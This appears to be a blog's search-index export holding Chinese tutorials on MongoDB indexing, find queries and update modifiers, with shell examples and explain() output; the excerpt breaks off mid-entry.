explain()是官方提供的一个用于返回当前查询过程信息的一个方法，通过这个命令，我们可以知道查询的过程，以便于我们进行优化，explain()支持这些操作的过程查询：\naggregate() count() distinct() find() group() remove() update() explain()方法接受三种可选字符串作为参数和两种布尔值，官方是这样来介绍的：\n可选的。指定说明输出的详细程度模式。该模式会影响explain()返回信息的数量和行为。可能的模式有：\u0026ldquo;queryPlanner\u0026rdquo;， \u0026ldquo;executionStats\u0026rdquo;，和\u0026quot;allPlansExecution\u0026quot;。 默认模式是\u0026quot;queryPlanner\u0026quot;。 为了向后兼容早期版本 cursor.explain()，MongoDB解释true为 \u0026ldquo;allPlansExecution\u0026quot;和false \u0026ldquo;queryPlanner\u0026rdquo;。 aggregate()忽略verbosity参数并在queryPlanner模式下执行。\n首先我们插入100000条数据，可以通过下面代码来循环插入：\nfor(var i = 0; i \u0026lt; 100000; i++) { db.test.insert({ id: i, username: \u0026#39;user\u0026#39; + i }); } 然后我们通过explain()方法看看查询含有username:user108键值的文档过程：\ndb.test.find({username: \u0026#39;user108\u0026#39;}).explain(true); 返回的结果大概为：\n{ \u0026#34;queryPlanner\u0026#34; : { \u0026#34;plannerVersion\u0026#34; : 1, \u0026#34;namespace\u0026#34; : \u0026#34;blog.test\u0026#34;, \u0026#34;indexFilterSet\u0026#34; : false, \u0026#34;parsedQuery\u0026#34; : { \u0026#34;username\u0026#34; : { \u0026#34;$eq\u0026#34; : \u0026#34;user4\u0026#34; } }, \u0026#34;winningPlan\u0026#34; : { \u0026#34;stage\u0026#34; : \u0026#34;COLLSCAN\u0026#34;, \u0026#34;filter\u0026#34; : { \u0026#34;username\u0026#34; : { \u0026#34;$eq\u0026#34; : \u0026#34;user4\u0026#34; } }, \u0026#34;direction\u0026#34; : \u0026#34;forward\u0026#34; }, \u0026#34;rejectedPlans\u0026#34; : [ ] }, \u0026#34;executionStats\u0026#34; : { \u0026#34;executionSuccess\u0026#34; : true, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillis\u0026#34; : 48, \u0026#34;totalKeysExamined\u0026#34; : 0, \u0026#34;totalDocsExamined\u0026#34; : 100000, \u0026#34;executionStages\u0026#34; : { \u0026#34;stage\u0026#34; : \u0026#34;COLLSCAN\u0026#34;, \u0026#34;filter\u0026#34; : { \u0026#34;username\u0026#34; : { \u0026#34;$eq\u0026#34; : \u0026#34;user4\u0026#34; } }, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillisEstimate\u0026#34; : 37, \u0026#34;works\u0026#34; : 100002, \u0026#34;advanced\u0026#34; : 1, \u0026#34;needTime\u0026#34; : 100000, \u0026#34;needYield\u0026#34; : 0, \u0026#34;saveState\u0026#34; : 782, \u0026#34;restoreState\u0026#34; : 782, \u0026#34;isEOF\u0026#34; : 1, \u0026#34;invalidates\u0026#34; : 0, \u0026#34;direction\u0026#34; : \u0026#34;forward\u0026#34;, \u0026#34;docsExamined\u0026#34; : 100000 }, \u0026#34;allPlansExecution\u0026#34; : [ ] }, \u0026#34;serverInfo\u0026#34; : { \u0026#34;host\u0026#34; : \u0026#34;YizhoudeMacBook-Pro.local\u0026#34;, \u0026#34;port\u0026#34; : 27017, \u0026#34;version\u0026#34; : \u0026#34;3.4.6\u0026#34;, \u0026#34;gitVersion\u0026#34; : \u0026#34;c55eb86ef46ee7aede3b1e2a5d184a7df4bfb5b5\u0026#34; }, \u0026#34;ok\u0026#34; : 1 } 在上面返回的过程中，我们只需要关注executionStats对象里面的值中的：\ntotalDocsExamined: 文档扫描总数 executionTimeMillis: 执行时间(毫秒) nReturned: 返回的文档数量 一般通过这三个值就可以判断文档执行需不需要优化，比如上面返回的信息中表示这次查询文档扫描总数100000，执行时间48毫秒，返回的文档数量为1。\n通过上面的返回信息其实我们可以看出，find()方法其实是扫描了整个集合来查询我们需要的，即使找到了我们需要的文档，但还会继续往下查询，因为find()方法是查询所有符合条件的文档，这里其实是浪费了服务器的资源。\n我们已知username是唯一值，那么我们可以findOne,或者通过limit(1)来限制返回的数量，限制了返回的数量后，Mongodb内部查询是查询到符合的第一条文档就停止，比如我们要查询user5，那么查找的文档总数将是查询到第一条符合的文档数止到第一条文档的总和，这样看上去是没有问题了，但是一旦我们查询的是user99995，那么扫描的文档数量将是99995，这样的方式属于治标不治本。\n建立索引 Mongodb建立索引是通过createIndex()方法建立，参数为一个对象，包含了需要建立索引的键：\ndb.test.createIndex({username: 1}); 建立的索引其实相当于保存在Mongodb内部的一个单独的文档，这个文档存放了所有username的值和对应储存的物理位置，大概结构为(下面数据是比喻，并不代表真实性)：\nusername Index [\u0026#39;user1\u0026#39;, 0x00000001], [\u0026#39;user2\u0026#39;, 0x00000002], [\u0026#39;user3\u0026#39;, 0x00000003], [\u0026#39;user4\u0026#39;, 0x00000004], [\u0026#39;user5\u0026#39;, 0x00000005], ........ [\u0026#39;user100000\u0026#39;, 0x00100000] 索引选项 db.collection.createIndex(key，options); 我们可以通过多个选项对索引的文档进行限制，其中很有用的一个就是unique，使用方法如下：\ndb.test.createIndex({username: 1}，{unique: 1}); 通过上面的设置username键的值在整个集合中必须是唯一的，如果你试图插入两个username键值相等的文档，那么将会报错，比如下面这样：\ndb.test.createIndex({username: 1}，{unique: 1}); db.test.insert({username: \u0026#39;user200\u0026#39;}); db.test.insert({username: \u0026#39;user200\u0026#39;}); ----Error!! 它同样适用于复合索引，在对复合索引使用唯一值选项后，如果你试图插入两个及以上索引键的值都一样的两个文档，那么将报错，如果是两个文档的其中一个值不一样同样可以插入，比如下面代码所示：\ndb.test.createIndex({username: 1, age: 1}，{unique: 1}); db.test.insert({username: \u0026#39;user200\u0026#39;, age:18}); db.test.insert({username: \u0026#39;user200\u0026#39;, age:20}); 以上两个方式都是可以正常插入的，因为插入的这两个文档中的age不一样，但是如果像下面这样就会报错了：\ndb.test.createIndex({username: 1, age: 1}，{unique: 1}); db.test.insert({username: \u0026#39;user200\u0026#39;, age:18}); db.test.insert({username: \u0026#39;user200\u0026#39;, age:18}); ----Error!! 当然除了唯一值选项的设置之外，还有很多选项的设置，如果大家有兴趣可以到官方文档查看。\n使用索引 建立了索引后，我们不需要特别的方式去查询，我们可以像普通的查询方式一样的去查询：\ndb.test.find({username: \u0026#39;user9999\u0026#39;}); 在查询的时候Mongodb会自动的查找我们是否为username键建立索引，如果有则扫描username的索引文档，找到相应的值后，然后在根据相应的物理地址去扫描对应的文档，如果没有则扫描test集合的所有文档。\n建立了索引后，我们来看看查找username: 'user9999'键值对的文档需要的时间以及查询上的效率：\ndb.test.find({username: \u0026#39;user9999\u0026#39;}).explain(true); 返回的过程信息(只拿出executionStats属性)：\n\u0026#34;executionStats\u0026#34; : { \u0026#34;executionSuccess\u0026#34; : true, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillis\u0026#34; : 0, \u0026#34;totalKeysExamined\u0026#34; : 1, \u0026#34;totalDocsExamined\u0026#34; : 1, \u0026#34;executionStages\u0026#34; : { \u0026#34;stage\u0026#34; : \u0026#34;FETCH\u0026#34;, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillisEstimate\u0026#34; : 0, \u0026#34;works\u0026#34; : 2, \u0026#34;advanced\u0026#34; : 1, \u0026#34;needTime\u0026#34; : 0, \u0026#34;needYield\u0026#34; : 0, \u0026#34;saveState\u0026#34; : 0, \u0026#34;restoreState\u0026#34; : 0, \u0026#34;isEOF\u0026#34; : 1, \u0026#34;invalidates\u0026#34; : 0, \u0026#34;docsExamined\u0026#34; : 1, \u0026#34;alreadyHasObj\u0026#34; : 0, \u0026#34;inputStage\u0026#34; : { \u0026#34;stage\u0026#34; : \u0026#34;IXSCAN\u0026#34;, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillisEstimate\u0026#34; : 0, \u0026#34;works\u0026#34; : 2, \u0026#34;advanced\u0026#34; : 1, \u0026#34;needTime\u0026#34; : 0, \u0026#34;needYield\u0026#34; : 0, \u0026#34;saveState\u0026#34; : 0, \u0026#34;restoreState\u0026#34; : 0, \u0026#34;isEOF\u0026#34; : 1, \u0026#34;invalidates\u0026#34; : 0, \u0026#34;keyPattern\u0026#34; : { \u0026#34;username\u0026#34; : 1 }, \u0026#34;indexName\u0026#34; : \u0026#34;username_1\u0026#34;, \u0026#34;isMultiKey\u0026#34; : false, \u0026#34;multiKeyPaths\u0026#34; : { \u0026#34;username\u0026#34; : [ ] }, \u0026#34;isUnique\u0026#34; : false, \u0026#34;isSparse\u0026#34; : false, \u0026#34;isPartial\u0026#34; : false, \u0026#34;indexVersion\u0026#34; : 2, \u0026#34;direction\u0026#34; : \u0026#34;forward\u0026#34;, \u0026#34;indexBounds\u0026#34; : { \u0026#34;username\u0026#34; : [ \u0026#34;[\u0026#34;user9999\u0026#34;, \u0026#34;user9999\u0026#34;]\u0026#34; ] }, \u0026#34;keysExamined\u0026#34; : 1, \u0026#34;seeks\u0026#34; : 1, \u0026#34;dupsTested\u0026#34; : 0, \u0026#34;dupsDropped\u0026#34; : 0, \u0026#34;seenInvalidated\u0026#34; : 0 } }, \u0026#34;allPlansExecution\u0026#34; : [ ] } 通过上面的返回信息中，我们可以看到\ntotalDocsExamined: 1 //扫描的文档数量为1 executionTimeMillis: 0 //执行的时间小于0毫秒 nReturned: 1 //返回的文档数为1 复合索引 符合索引指的是一个索引文档中存在两个值及以上的值，比如下面这样：\ndb.test.createIndex({username: 1, id: 1}); 通过上面的语句可以创建符合索引，当我们每次查询这两个键的时候，都会从索引文档中查询，如果你经常会以两个键值对查询文档，那么符合索引非常适合你。\n复合索引的第一个值可以单独查询，但是第二个值无法单独查询，什么意思呢，你可以理解成一个索引文档以第一个索引键命名，这样就很清楚了，当我们单独查询username的时候会找到这个索引文档,但是当我们单独查询id的时候无法找到这个索引文档。\n那么根据上面的理论可以得出，只要第一个值匹配到索引文档，那么在复合索引中不管你跟的是复合索引中添加的哪个值都可以进行索引，比如下面的代码都可以进行复合索引：\ndb.test.createIndex({username: 1, id: 1, age: 1, adreess: 1}); db.test.find({username: \u0026#39;user400\u0026#39;}); db.test.find({username: \u0026#39;user400\u0026#39;, age: 18}); db.test.find({username: \u0026#39;user400\u0026#39;, adreess: \u0026#39;xxxx\u0026#39;}); 对象索引 Mongodb可以支持对象索引，比如下面这样：\nvar a = { b: 1, c: 2 } db.test.createIndex({a: 1}); 或者对某个子键索引 db.test.createIndex({a.b: 1}); 需要注意的是上面两种方法的索引效果截然不同，第一个建立索引是建立一个对象索引,对象中的所有值都会提高查询效率。而第二个建立的索引是建立一个子键索引，只对子键提高查询效率。\n数组索引 Mongodb支持对数组索引，比如像下面这样：\nvar a = [ { b: 1, c: 2 }, { b: 3, c: 4 } ]; db.test.createIndex({a: 1}); 或者对某个子键索引 db.test.createIndex({a.b: 1}); 上面两种方式也是不同的，第一种是建立一个数组索引，并且Mongodb会对数组的每一个成员建立索引，这于对象是不一样的。而第二种是建立一个数组子成员的子键索引。\nMongodb只允许复合索引中出现一个数组，如果出现了一个以上的数组将是非法的，应当尽可能的不去使用整个数组索引。\n获取索引 我们可以通过getIndexes()方法来获取当前集合所建立的所有索引信息，默认会返回一个_id索引，这个索引是Mongodb自动建立的。\ngetIndexes()使用方法：\ndb.test.getIndexes(); 返回的大概信息:\n[ { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_id\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;blog.test\u0026#34; }, { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;username\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;username_1\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;blog.test\u0026#34; } ] 返回的信息当中，各个键值表示的是：\nv：表示索引版本 key: 表示索引的键，值为表示正序倒序 1 或者 -1 name: 索引的标识符 ns: 作用于的集合 删除索引 Mongodb提供了dropIndex()来删除索引，它接受一个字符串参数，这个参数是索引的name值。删除索引可以根据getIndexes()方法查询到的name的值来删除，比如：\ndb.test.dropIndex(\u0026#39;username_1\u0026#39;); 注意事项 索引建立后，每次添加、修改、更新、删除数据，Mongodb都会更新索引文档，这也带来了一个问题，就是每当我们操作数据的时候，会比以前慢一点，因为操作数据的同时，Mongodb还会自动更新索引文档，为了不影响效率，一个集合最多只能存在64个索引\n","permalink":"/posts/mongodb-index/","summary":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n前言 建立索引对于任何需要提高查询速度的数据库来说都非常重要，那么索引究竟是一个什么？首先来看看下面是《区块链:技术驱动金融》这本书的前两章的目录。\n第1章密码学及加密货币概述----------1 1.1密码学哈希函数----------4 1.2哈希指针及数据结构----------14 1.3数字签名----------19 1.4公钥即身份----------24 1.5两种简单的加密货币----------26 第2章比特币如何做到去中心化----------35 2.1中心化与去中心化----------37 2.2分布式共识----------39 2.3使用区块链达成没有身份的共识----------44 2.4奖励机制与工作量证明----------51 2.5总结----------59 通过目录，我们能很快很清楚的知道这本书写了什么，而我们也能很快从中查找到我们感兴趣的内容在哪一页，如果没有目录，我们将会一篇一篇的去翻阅我们想了解的内容，而索引可以比作数据库的目录。\n效率 explain()是官方提供的一个用于返回当前查询过程信息的一个方法，通过这个命令，我们可以知道查询的过程，以便于我们进行优化，explain()支持这些操作的过程查询：\naggregate() count() distinct() find() group() remove() update() explain()方法接受三种可选字符串作为参数和两种布尔值，官方是这样来介绍的：\n可选的。指定说明输出的详细程度模式。该模式会影响explain()返回信息的数量和行为。可能的模式有：\u0026ldquo;queryPlanner\u0026rdquo;， \u0026ldquo;executionStats\u0026rdquo;，和\u0026quot;allPlansExecution\u0026quot;。 默认模式是\u0026quot;queryPlanner\u0026quot;。 为了向后兼容早期版本 cursor.explain()，MongoDB解释true为 \u0026ldquo;allPlansExecution\u0026quot;和false \u0026ldquo;queryPlanner\u0026rdquo;。 aggregate()忽略verbosity参数并在queryPlanner模式下执行。\n首先我们插入100000条数据，可以通过下面代码来循环插入：\nfor(var i = 0; i \u0026lt; 100000; i++) { db.test.insert({ id: i, username: \u0026#39;user\u0026#39; + i }); } 然后我们通过explain()方法看看查询含有username:user108键值的文档过程：\ndb.test.find({username: \u0026#39;user108\u0026#39;}).explain(true); 返回的结果大概为：\n{ \u0026#34;queryPlanner\u0026#34; : { \u0026#34;plannerVersion\u0026#34; : 1, \u0026#34;namespace\u0026#34; : \u0026#34;blog.test\u0026#34;, \u0026#34;indexFilterSet\u0026#34; : false, \u0026#34;parsedQuery\u0026#34; : { \u0026#34;username\u0026#34; : { \u0026#34;$eq\u0026#34; : \u0026#34;user4\u0026#34; } }, \u0026#34;winningPlan\u0026#34; : { \u0026#34;stage\u0026#34; : \u0026#34;COLLSCAN\u0026#34;, \u0026#34;filter\u0026#34; : { \u0026#34;username\u0026#34; : { \u0026#34;$eq\u0026#34; : \u0026#34;user4\u0026#34; } }, \u0026#34;direction\u0026#34; : \u0026#34;forward\u0026#34; }, \u0026#34;rejectedPlans\u0026#34; : [ ] }, \u0026#34;executionStats\u0026#34; : { \u0026#34;executionSuccess\u0026#34; : true, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillis\u0026#34; : 48, \u0026#34;totalKeysExamined\u0026#34; : 0, \u0026#34;totalDocsExamined\u0026#34; : 100000, \u0026#34;executionStages\u0026#34; : { \u0026#34;stage\u0026#34; : \u0026#34;COLLSCAN\u0026#34;, \u0026#34;filter\u0026#34; : { \u0026#34;username\u0026#34; : { \u0026#34;$eq\u0026#34; : \u0026#34;user4\u0026#34; } }, \u0026#34;nReturned\u0026#34; : 1, \u0026#34;executionTimeMillisEstimate\u0026#34; : 37, \u0026#34;works\u0026#34; : 100002, \u0026#34;advanced\u0026#34; : 1, \u0026#34;needTime\u0026#34; : 100000, \u0026#34;needYield\u0026#34; : 0, \u0026#34;saveState\u0026#34; : 782, \u0026#34;restoreState\u0026#34; : 782, \u0026#34;isEOF\u0026#34; : 1, \u0026#34;invalidates\u0026#34; : 0, \u0026#34;direction\u0026#34; : \u0026#34;forward\u0026#34;, \u0026#34;docsExamined\u0026#34; : 100000 }, \u0026#34;allPlansExecution\u0026#34; : [ ] }, \u0026#34;serverInfo\u0026#34; : { \u0026#34;host\u0026#34; : \u0026#34;YizhoudeMacBook-Pro.","title":"Mongodb索引"},{"content":"参考 MongoDB权威指南(第2版)\nMongodb Documentation\n前言 在Mongodb中查询的方法常用的有两个find和findOne，前者返回所有匹配的文档，而后者返回匹配的第一个文档，它的用法很简单。第一个是它的查询条件，第二个是指定返回文档中字段的过滤器，这个的作用也就是说你想显示哪些字段或者你想不显示哪些字段。并且该方法返回的是一个Cursor对象。\n需要注意的是，find方法查询的时候会查询数组的成员是否符合查询条件，如果查询条件符合，将会把整个数组返回。\ndb.collection.find(query, projection) 比如下面通过find语句，查询blog集合中作者为xsscript的文档，并且只返回作者和文章内容。\ndb.blog.find({author: \u0026#39;xsscript\u0026#39;}, {author: 1, content: 1}); 在过滤器中，你如果没有显示的声明不返回_id键，默认都会返回，除非显示的声明_id: 0。还有比如在过滤器中设置了auther: 1，那么只会返回_id和auther两个键值，如果你只需要过滤一些不希望显示的值，那么就在过滤器中设置你需要不显示的键并把值设为0，这样文档中所有的值除了你设置不返回的都会返回。\n如果你需要查询多个值匹配的文档，你可以像下面代码所示，把你需要的条件都写在第一个参数对象中，这样的查询其实是AND查询，下面的代码查询了集合中所有文档中作者是xsscript,时间为20170701，并且只返回作者、时间、内容，其中_id不显示。\ndb.blog.find({author: \u0026#39;xsscript\u0026#39;, time: 20170701},{ author: 1, content: 1, time: 1, _id: 0 }) 条件查询 一个键可以存在多个条件\n比较操作符 $lt、$lte、gt、gte这四个比较查询符分别表示\u0026lt;、\u0026lt;=、\u0026gt;、\u0026gt;=，可以将其比较查询符组合起来查询，这个代码对于范围查询的筛选非常有用。比如我需要查询年龄大于17岁到25岁之间的文档，代码如下面所示：\ndb.test.find({ age: { $gt: 18, $lte: 25 } }); 包含查询操作符 $in操作符是多个条件针对一个键的值进行匹配，比如我需要查询年龄在18、20、25、30的文档，就可以使用$in操作符：\ndb.test.find({ age: { $in: [18, 20, 25, 30] } }); $or操作符是多个条件匹配多个键值，它非常有用，就有点类似于JS中的||符号，比如我需要查询一个文档中含有age: 18或者含有name: joe的文档，就可以使用$or操作符，比如下面的代码\ndb.test.find({ $or: [ {age: 18}, {name: \u0026#39;joe\u0026#39;} ] }) 对应$in和$or操作符的还有一个反义的即$nin和$nor操作符，后两个操作符的意思是返回不包含查询条件匹配到的所有文档，但是注意，如果在使用后者的两个操作符进行查询的话，会存在一个问题需要注意，比如下面\ndb.test.find({ a: { $nin: [1,2,3] } }) 上面的代码理想的意思是匹配a键的值非1,2,3，但是返回的文档中可能会存在没有a键的文档。\n取反操作符 $not取反操作符，用于对结果进行取反，我们可以实现一个和$nin操作符相同的操作来演示$not的效果：\ndb.test.find({ a: { $not: { $in: [1,2,3] } } }) 多条件查询操作符 $and操作符是用于多条件查询的，但是它更加灵活，比如下面匹配文档中含有a:1和author: xsscript的键值对：\ndb.test.find({ $and: [ {a: 1}, {author: \u0026#39;xsscript\u0026#39;} ] }) 数组查询 在Mongodb中，查询数组可以通过下面的方式查询，比如下面的例子：\n文档\n{ a: [\u0026#39;one\u0026#39;,\u0026#39;two\u0026#39;] } 代码\ndb.test.find({ a: [\u0026#39;one\u0026#39;, \u0026#39;two\u0026#39;] }) 上面的代码能够匹配文档，但是需要注意的一点匹配的条件顺序如果和文档不一致，就不能匹配文档。\n数组包含操作符 $all操作符的作用和行为都与上面的代码一致，但是有一点不同，就是$all操作符包含的数组成员不分顺序，只要数组含有这两个值就匹配成功：\n文档\n{ a: [\u0026#39;one\u0026#39;,\u0026#39;two\u0026#39;] } 代码\ndb.test.find({ a: { $all: [\u0026#39;two\u0026#39;, \u0026#39;one\u0026#39;] } }) 数组长度操作符 $size操作符用于匹配指定数组长度的文档，比如下面的代码：\n文档\n{ a: [\u0026#39;one\u0026#39;,\u0026#39;two\u0026#39;] } 代码\ndb.test.find({ a: { $size: 2 } }) 返回数组成员截取符 $slice操作符用于指定数组返回的成员数，可以是正数和负数，正数从第一个开始截取，负数从倒数第一开始截取。\n文档\n{ a: [\u0026#39;one\u0026#39;,\u0026#39;two\u0026#39;] } 代码\ndb.test.find({ a: { $slice: 1 } }) 数组比较操作符 $elemMatch操作符是针对数组成员进行比较的操作符，如果不使用这个操作符将出现一些问题，比如下面，我想通过大于10并且小于20来匹配文档1的数组成员，但是这样通常得不到想要的效果，这是因为文档1的a键是一个数组，里面成员符合条件，里面的成员5小于20，成员25大于10。\n文档1\n{ a: [5,25] } 代码：\ndb.test.find({ a: { $lt: 20, $gt: 10 } }); 但是如果使用了$elemMatch操作符就不会存在这样的问题，它会把所有的条件对数组成员进行匹配：\n{ a: [5,25] } 代码：\ndb.test.find({ a: { $elemMatch: { $lt: 20, $gt: 10 } } }); $占位符 当我们匹配非数组键值对的时候，我们需要返回的只需要的键值对是这样操作的：\ndb.test.find({author: \u0026#39;xsscript\u0026#39;}, {author: 1}); 那如果我们数组呢？如果我们数组按照上面的方法呢？可能只会返回每个数组成员中指定显示的值，而我们需要的是只返回匹配到的数组成员，那么这个时候就可以用占位符$了，它相当于是匹配到的文档中的数组成员下标占位符。\n文档\n{ a: [ {b: \u0026#39;one\u0026#39;}, {c: \u0026#39;two\u0026#39;} ] } db.test.find({ \u0026#39;a.b\u0026#39; : \u0026#39;one\u0026#39; }, { \u0026#39;a.$.b\u0026#39; 1 }) 上面的代码返回的文档就会正确了\n{ a: [ {b: \u0026#39;one\u0026#39;} ] } 文完\n","permalink":"/posts/mongodb-find/","summary":"参考 MongoDB权威指南(第2版)\nMongodb Documentation\n前言 在Mongodb中查询的方法常用的有两个find和findOne，前者返回所有匹配的文档，而后者返回匹配的第一个文档，它的用法很简单。第一个是它的查询条件，第二个是指定返回文档中字段的过滤器，这个的作用也就是说你想显示哪些字段或者你想不显示哪些字段。并且该方法返回的是一个Cursor对象。\n需要注意的是，find方法查询的时候会查询数组的成员是否符合查询条件，如果查询条件符合，将会把整个数组返回。\ndb.collection.find(query, projection) 比如下面通过find语句，查询blog集合中作者为xsscript的文档，并且只返回作者和文章内容。\ndb.blog.find({author: \u0026#39;xsscript\u0026#39;}, {author: 1, content: 1}); 在过滤器中，你如果没有显示的声明不返回_id键，默认都会返回，除非显示的声明_id: 0。还有比如在过滤器中设置了auther: 1，那么只会返回_id和auther两个键值，如果你只需要过滤一些不希望显示的值，那么就在过滤器中设置你需要不显示的键并把值设为0，这样文档中所有的值除了你设置不返回的都会返回。\n如果你需要查询多个值匹配的文档，你可以像下面代码所示，把你需要的条件都写在第一个参数对象中，这样的查询其实是AND查询，下面的代码查询了集合中所有文档中作者是xsscript,时间为20170701，并且只返回作者、时间、内容，其中_id不显示。\ndb.blog.find({author: \u0026#39;xsscript\u0026#39;, time: 20170701},{ author: 1, content: 1, time: 1, _id: 0 }) 条件查询 一个键可以存在多个条件\n比较操作符 $lt、$lte、gt、gte这四个比较查询符分别表示\u0026lt;、\u0026lt;=、\u0026gt;、\u0026gt;=，可以将其比较查询符组合起来查询，这个代码对于范围查询的筛选非常有用。比如我需要查询年龄大于17岁到25岁之间的文档，代码如下面所示：\ndb.test.find({ age: { $gt: 18, $lte: 25 } }); 包含查询操作符 $in操作符是多个条件针对一个键的值进行匹配，比如我需要查询年龄在18、20、25、30的文档，就可以使用$in操作符：\ndb.test.find({ age: { $in: [18, 20, 25, 30] } }); $or操作符是多个条件匹配多个键值，它非常有用，就有点类似于JS中的||符号，比如我需要查询一个文档中含有age: 18或者含有name: joe的文档，就可以使用$or操作符，比如下面的代码\ndb.test.find({ $or: [ {age: 18}, {name: \u0026#39;joe\u0026#39;} ] }) 对应$in和$or操作符的还有一个反义的即$nin和$nor操作符，后两个操作符的意思是返回不包含查询条件匹配到的所有文档，但是注意，如果在使用后者的两个操作符进行查询的话，会存在一个问题需要注意，比如下面","title":"Mongodb查询"},{"content":"参考 MongoDB权威指南(第2版)\n前言 在Mongodb中我们使用的是update方法去更新我们需要更新的文档，比如下面的一个文档结构：\n{ a: 1, b: 2, c: 3 } 我们想通过update方法来更新里面的键值对a: 1为a: 2，或者是只对文档里面的一个键的值进行更改，按照代码所示我们会像下面这样来写代码：\ndb.test.update({ a: 1 },{ a: 2 }); 但是真的如我们所示吗？其实结果并不是我们想要的，上面的代码执行后，其实文档更新后的结果为：\n{ a: 2 } 上面的执行代码覆盖了我们整个文档，当然这不是我们想要的结果。如果想要达到我们理想的结果，我们需要使用Mongodb提供的更新修改器(Update Modifier)。\n一个键只能存在一个更新修改器\n$inc修改器 $inc修改器主要是增对指定键的值进行增加值，$inc修改器是能操作数值类型值，这个修改器非常有用。比如下面，通过$inc修改器来计数访问统计。\n文档：\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 1 } 代码：\ndb.blog.update({ title: \u0026#39;analytics\u0026#39; },{ $inc: { analyticsCount: 1 //这里代表的是给analyticsCount键的值增加1 } }); 执行代码后文档为：\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 2 } $set修改器 和 $unset修改器 $set修改器的作用是重写一个键的值，注意这里是重写这个键的值，并不是增加。如果没有这个键则添加并设置值，比如给下面的文档添加一个page键并设置值为\u0026rsquo;index\u0026rsquo;。\n文档\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 1 } 代码\ndb.blog.update({ title: \u0026#39;analytics\u0026#39; }, { $set: { page: \u0026#39;index\u0026#39; } }); 执行后的文档\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 1, page: \u0026#39;index\u0026#39; } $unset修改器的作用是删除文档中的一个键值，比如上面的文档我不想要page键值了，那么通过下面代码可以删除page键值，而不影响这个文档中的其他数据\n代码\ndb.blog.update({ title: \u0026#39;analytics\u0026#39; }, { $unset: { page: 1 //这里意思是删除page键值后面跟着的可以为1也可以为true，表示确认删除 } }); $setOnInsert修改器 $setOnInsert修改器配合update方法的第三个参数使用upsert。\ndb.test.update({a: 1}, {b: 1}, {upsert: true}) 上面的代码执行后会首先会查找是否有a: 1匹配的文档，如果有则替换整个文档内容为b: 1，如果没有则新建一个文档内容为b: 1。而$setOnInsert修改器就是如果遇见没有找到的匹配的文档就新建一个文档并插入后面的值，如果匹配到相应的文档则什么都不做，这个功能相当于设置了一个默认值。\ndb.test.update({a: 1}, {$setOnInsert: {b: 1}}, {upsert: true}) 还需要注意的是update方法默认是只对匹配到的第一个文档执行操作，如果需要对所有匹配到的文档进行操作，那么就需要在第三个参数设置multi的值为true，比如下面这样：\ndb.test.update({a: 1}, {$setOnInsert: {b: 1}}, {upsert: true, multi: true}); 数组修改器 $push修改器 $push修改器的作用是向一个键的值为数组类型的值末尾添加数据，如果没有这个键则创建一个，但是如果这个键已经存在了，它的值就必须是数组类型，否则会像下面一样报错：\nThe field \u0026#39;page\u0026#39; must be an array but is of type bool in document xxxxx 下面的代码是使用$push修改器给文档增加了一个b键，值为一个对象\n文档\n{ a: 1 } 代码\ndb.blog.update({ a: 1 }, { $push: { b: {c: 1} } }) 执行后的文档\n{ a: 1, b: [{c: 1}] } $each子修改器 $push一次性只能增加一个数据，如果有大量数据需要写入，每次调用$push修改器那么性能会大大的降低，$each子修改器的出现解决了这个问题，它后面跟一个数组，这个数组的所有值将被依次添加到末尾。\n文档\n{ a: 1, b: [{c:1}] } 代码\ndb.blog.update({ a: 1 }, { $push: { pa:{ $each: [{b:1}, {c:1}, {d:1}] } } }) 执行后的文档\n{ a: 1, b: [{c: 1}, {b:1}, {c:1}, {d:1}] } $slice修改器 $slice修改器配合$each能够限制对操作的键值限制能够写入的最大数据，$slice后面跟着一个数字，可以是负数也可以是正数，比如是正数2则取出$each数组中从取出前两个成员重写操作的键的值，负数相反。注意这个方法影响操作键的原始数据。\n文档\n{ a: 1, b: [{c:1}] } 代码\ndb.blog.update({a: 1}, { $push: { b: { $each: [5,6,7,5,4,3], $slice: 2 } } }); 执行后的文档\n{ a: 1, b: [5, 6] } $addToSet修改器 $addToSet修改器可以向数组添加不重复的内容，意思是如果数组中有重复数据，就不在添加。如果$addToSet修改器操作的键不存在，则添加这个键，并且这个键的值为数组，添加的数据为这个数组的成员。\n比如下面的代码，执行了两次添加字符串one,执行了一次添加two，在最终的文档中只有两个成员，one和two\n文档\n{ a: 1 } 代码\ndb.blog.update({a: 1}, { $addToSet: { c: \u0026#39;one\u0026#39; } }); db.blog.update({a: 1}, { $addToSet: { c: \u0026#39;one\u0026#39; } }); db.blog.update({a: 1}, { $addToSet: { c: \u0026#39;two\u0026#39; } }); 执行后的文档\n{ a: 1, c: [\u0026#39;one\u0026#39;] } $pop修改器 $pop修改器用于对数组删除成员，对需要删除的键设置为1则把最后一个成员删除，-1则从正序开始删除第一个成员，如果操作一个不存在的键，还是会返回执行成功。\n文档\n{ a: 1 b: [1,2,3] } 代码\ndb.blog.update({a: 1}, { $pop: { b: -1 } }) 执行结果\n{ a: 1, b: [1,2] } $pull修改器 $pull修改器用于删除数组中特定的成员，这样很方便我们控制数组里的成员，不用通过循环和索引来删除，比如下面的代码：\n文档\n{ a: 1 b: [1,2,3] } 代码\ndb.blog.update({a: 1}, { $pull: { b: 2 } }) 执行后的文档\n{ a: 1 b: [1,3] } 文完\n","permalink":"/posts/mongodb-update-modifier/","summary":"参考 MongoDB权威指南(第2版)\n前言 在Mongodb中我们使用的是update方法去更新我们需要更新的文档，比如下面的一个文档结构：\n{ a: 1, b: 2, c: 3 } 我们想通过update方法来更新里面的键值对a: 1为a: 2，或者是只对文档里面的一个键的值进行更改，按照代码所示我们会像下面这样来写代码：\ndb.test.update({ 